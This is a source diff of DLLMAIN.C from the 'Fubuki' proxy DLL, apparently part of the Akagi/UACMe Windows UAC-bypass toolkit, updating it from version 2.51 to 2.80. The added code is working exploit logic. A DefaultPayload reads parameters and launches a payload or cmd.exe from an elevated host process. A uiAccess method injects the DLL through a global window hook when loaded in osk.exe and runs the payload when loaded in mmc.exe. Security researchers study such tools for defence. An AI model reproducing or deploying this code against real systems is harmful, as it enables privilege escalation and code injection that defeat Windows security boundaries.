@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2016
+*  (C) COPYRIGHT AUTHORS, 2014 - 2017
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     2.51
+*  VERSION:     2.80
 *
-*  DATE:        10 July 2016
+*  DATE:        06 Sept 2017
 *
 *  Proxy dll entry point, Fubuki Kai Ni.
 *
@@ -29,9 +29,11 @@
 #pragma warning(disable: 6102) // Using %s from failed function call at line %u
 
 #include <windows.h>
-#include "..\Shared\ntos.h"
+#include "shared\ntos.h"
 #include <ntstatus.h>
-#include "..\shared\minirtl.h"
+#include "shared\minirtl.h"
+#include "shared\_filename.h"
+#include "shared\util.h"
 #include "unbcl.h"
 #include "wbemcomn.h"
 
@@ -44,15 +46,13 @@
 #endif
 #endif
 
-#define T_AKAGI_KEY    L"Software\\Akagi"
-#define T_AKAGI_PARAM  L"LoveLetter"
-#define T_AKAGI_FLAG   L"Flag"
+#define LoadedMsg      TEXT("Fubuki lock and loaded")
 
 //default execution flow
-#define AKAGI_FLAG_KILO  0
+#define AKAGI_FLAG_KILO  1
 
 //suppress all additional output
-#define AKAGI_FLAG_TANGO 1
+#define AKAGI_FLAG_TANGO 2
 
 DWORD g_AkagiFlag;
 
@@ -66,156 +66,152 @@ DWORD g_AkagiFlag;
 */
 VOID WINAPI DummyFunc(
     VOID
-    )
+)
 {
 }
 
 /*
-* ucmShowProcessIntegrityLevel
+* DefaultPayload
 *
 * Purpose:
 *
-* Output current integrity level of target application.
+* Process parameter if exist or start cmd.exe and exit immediatelly.
 *
 */
-void ucmShowProcessIntegrityLevel(
-    VOID
-    )
-{
-    NTSTATUS status;
-    HANDLE hToken;
-
-    ULONG LengthNeeded;
-
-    PTOKEN_MANDATORY_LABEL pTIL = NULL;
-    DWORD dwIntegrityLevel;
-    WCHAR *t = NULL;
-    WCHAR szBuffer[MAX_PATH + 1];
-
-    status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &hToken);
-    if (NT_SUCCESS(status)) {
-
-        status = NtQueryInformationToken(hToken, TokenIntegrityLevel, NULL, 0, &LengthNeeded);
-        if (status == STATUS_BUFFER_TOO_SMALL) {
-
-            pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, LengthNeeded);
-            if (pTIL) {
-                status = NtQueryInformationToken(hToken, TokenIntegrityLevel, pTIL, LengthNeeded, &LengthNeeded);
-                if (NT_SUCCESS(status)) {
-
-                    dwIntegrityLevel = *RtlSubAuthoritySid(pTIL->Label.Sid,
-                        (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));
-
-                    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
-                    {
-                        t = L"Low Process";
-                    }
-                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
-                        dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
-                    {
-                        t = L"Medium Process";
-                    }
-                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
-                    {
-                        t = L"High Integrity Process";
-                    }
-                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
-                    {
-                        t = L"System Integrity Process";
-                    }
-
-                    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-                    wsprintf(szBuffer, L"PID=%lu, IntegrityLevel=%ws",
-                        GetCurrentProcessId(), t);
-
-                }
-                LocalFree(pTIL);
-            }
-        }
-        NtClose(hToken);
-    }
-    if (t) MessageBox(GetDesktopWindow(), szBuffer, GetCommandLineW(), MB_ICONINFORMATION);
-}
-
-/*
-* ucmQueryCustomParameter
-*
-* Purpose:
-*
-* Query custom parameter and run it.
-*
-*/
-BOOL ucmQueryCustomParameter(
+VOID DefaultPayload(
     VOID
 )
 {
-    BOOL                    cond = FALSE, bResult = FALSE;
-    HKEY                    hKey = NULL;
-    LPWSTR                  lpParameter = NULL;
-    LRESULT                 lRet;
-    DWORD                   dwSize = 0, dwType, dwFlag = 0;
-    STARTUPINFOW            startupInfo;
-    PROCESS_INFORMATION     processInfo;
+    BOOL bIsLocalSystem = FALSE, bReadSuccess;
+    PWSTR lpParameter = NULL;
+    ULONG cbParameter = 0L;
 
-    do {
-        lRet = RegOpenKeyExW(HKEY_CURRENT_USER, T_AKAGI_KEY, 0, KEY_READ, &hKey);
-        if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
-            break;
+    OutputDebugString(LoadedMsg);
+
+    ucmIsLocalSystem(&bIsLocalSystem);
+    g_AkagiFlag = AKAGI_FLAG_KILO;     
+
+    bReadSuccess = ucmReadParameters(
+        &lpParameter,
+        &cbParameter,
+        &g_AkagiFlag,
+        NULL,
+        bIsLocalSystem);
+
+    ucmLaunchPayload(
+        lpParameter,
+        cbParameter);
+
+    if ((lpParameter == NULL) && (cbParameter == 0)) {
+        if (g_AkagiFlag == AKAGI_FLAG_KILO)
+            ucmQueryRuntimeInfo(FALSE);
+    }
+    else {
+        if (bReadSuccess) {
+            RtlFreeHeap(
+                NtCurrentPeb()->ProcessHeap,
+                0,
+                lpParameter);
         }
+    }
+    ExitProcess(0);
+}
 
-        g_AkagiFlag = AKAGI_FLAG_KILO;
+/*
+* UiAccessMethodHookProc
+*
+* Purpose:
+*
+* Window hook procedure for UiAccessMethod
+*
+*/
+LRESULT CALLBACK UiAccessMethodHookProc(
+    _In_ int nCode,
+    _In_ WPARAM wParam,
+    _In_ LPARAM lParam
+)
+{
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
 
-        dwType = REG_DWORD;
-        dwSize = sizeof(DWORD);
-        lRet = RegQueryValueExW(hKey, T_AKAGI_FLAG, NULL, &dwType, (LPBYTE)&dwFlag, &dwSize);
-        if (lRet == ERROR_SUCCESS) {
-            g_AkagiFlag = dwFlag;
-        }
+/*
+* UiAccessMethodPayload
+*
+* Purpose:
+*
+* Defines application context and either:
+* - installs windows hook for dll injection
+* - run default payload in target app context
+*
+*/
+VOID UiAccessMethodPayload(
+    _In_ HINSTANCE hinstDLL
+)
+{
+    LPWSTR lpFileName;
+    HHOOK hHook;
+    HOOKPROC HookProcedure;
+    WCHAR szModuleName[MAX_PATH + 1];
 
-        dwSize = 0;
-        lRet = RegQueryValueExW(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)NULL, &dwSize);
-        if (lRet != ERROR_SUCCESS) {
-            break;
-        }
+    OutputDebugString(LoadedMsg);
 
-        lpParameter = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize + 1);
-        if (lpParameter == NULL) {
-            break;
-        }
+    RtlSecureZeroMemory(szModuleName, sizeof(szModuleName));
+    if (GetModuleFileName(NULL, szModuleName, MAX_PATH) == 0)
+        return;
 
-        lRet = RegQueryValueExW(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)lpParameter, &dwSize);
-        if (lRet == ERROR_SUCCESS) {
+    lpFileName = _filename(szModuleName);
+    if (lpFileName == NULL)
+        return;
 
-            OutputDebugStringW(L"Akagi letter found");
-            OutputDebugStringW(lpParameter);
-
-            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
-            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
-            startupInfo.cb = sizeof(startupInfo);
-            GetStartupInfoW(&startupInfo);
-
-            bResult = CreateProcessW(NULL, lpParameter, NULL, NULL, FALSE, 0, NULL,
-                NULL, &startupInfo, &processInfo);
-
-            if (bResult) {
-                CloseHandle(processInfo.hProcess);
-                CloseHandle(processInfo.hThread);
+    //
+    // Check if we are in the required application context
+    // Are we inside osk.exe?
+    //
+    if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
+        HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, "_FubukiProc2");
+        if (HookProcedure) {
+            hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
+            if (hHook) {
+                //
+                // Timeout to be enough to spawn target app.
+                //
+                Sleep(15000);
+                UnhookWindowsHookEx(hHook);
             }
-
         }
-        HeapFree(GetProcessHeap(), 0, lpParameter);
-
-        RegCloseKey(hKey);
-        hKey = NULL;
-        RegDeleteKey(HKEY_CURRENT_USER, T_AKAGI_KEY);
-
-    } while (cond);
-
-    if (hKey != NULL) {
-        RegCloseKey(hKey);
+        ExitProcess(0);
     }
 
-    return bResult;
+    //
+    // Are we inside target app?
+    //
+    if (_strcmpi(lpFileName, TEXT("mmc.exe")) == 0) {
+        DefaultPayload();
+    }
+}
+
+/*
+* UiAccessMethodDllMain
+*
+* Purpose:
+*
+* Proxy dll entry point for uiAccess method.
+* Need dedicated entry point because of additional code.
+*
+*/
+BOOL WINAPI UiAccessMethodDllMain(
+    _In_ HINSTANCE hinstDLL,
+    _In_ DWORD fdwReason,
+    _In_ LPVOID lpvReserved
+)
+{
+    UNREFERENCED_PARAMETER(lpvReserved);
+
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        UiAccessMethodPayload(hinstDLL);
+    }
+
+    return TRUE;
 }
 
 /*
@@ -223,7 +219,7 @@ BOOL ucmQueryCustomParameter(
 *
 * Purpose:
 *
-* Proxy dll entry point, process parameter if exist or start cmd.exe and exit immediatelly.
+* Default proxy dll entry point.
 *
 */
 BOOL WINAPI DllMain(
@@ -232,46 +228,26 @@ BOOL WINAPI DllMain(
     _In_ LPVOID lpvReserved
 )
 {
-    DWORD					cch;
-    TCHAR					cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
-    STARTUPINFO				startupInfo;
-    PROCESS_INFORMATION		processInfo;
-
     UNREFERENCED_PARAMETER(hinstDLL);
     UNREFERENCED_PARAMETER(lpvReserved);
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
-
-        OutputDebugString(TEXT("Hello, Admiral"));
-
-        if (!ucmQueryCustomParameter()) {
-
-            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
-            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
-            startupInfo.cb = sizeof(startupInfo);
-            GetStartupInfoW(&startupInfo);         
-            
-            RtlSecureZeroMemory(sysdir, sizeof(sysdir));
-            cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
-            if ((cch != 0) && (cch < MAX_PATH)) {
-                RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
-                _strcpy(cmdbuf, sysdir);
-                _strcat(cmdbuf, TEXT("cmd.exe"));
-
-                if (CreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL,
-                    sysdir, &startupInfo, &processInfo))
-                {
-                    CloseHandle(processInfo.hProcess);
-                    CloseHandle(processInfo.hThread);
-
-                    if (g_AkagiFlag == AKAGI_FLAG_KILO) {
-                        ucmShowProcessIntegrityLevel();
-                    }
-                }
-            }
-
-        }
-        ExitProcess(0);
+        DefaultPayload();
     }
+
     return TRUE;
+}
+
+/*
+* EntryPoint
+*
+* Purpose:
+*
+* Entry point to be used in exe mode.
+*
+*/
+VOID WINAPI EntryPoint(
+    VOID)
+{
+    DefaultPayload();
 }
